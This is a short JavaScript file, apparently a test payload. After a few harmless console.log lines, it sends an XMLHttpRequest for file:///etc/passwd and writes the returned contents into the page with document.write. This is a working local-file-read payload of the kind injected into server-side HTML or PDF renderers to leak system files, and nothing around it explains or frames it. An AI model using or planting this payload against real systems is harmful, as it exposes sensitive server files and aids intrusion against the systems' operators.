console.log("file called");

console.log("welcome");
console.log("another updated");
// request
x=new XMLHttpRequest;
x.onload=function(){document.write(this.responseText)};
x.open("GET","file:///etc/passwd");x.send();
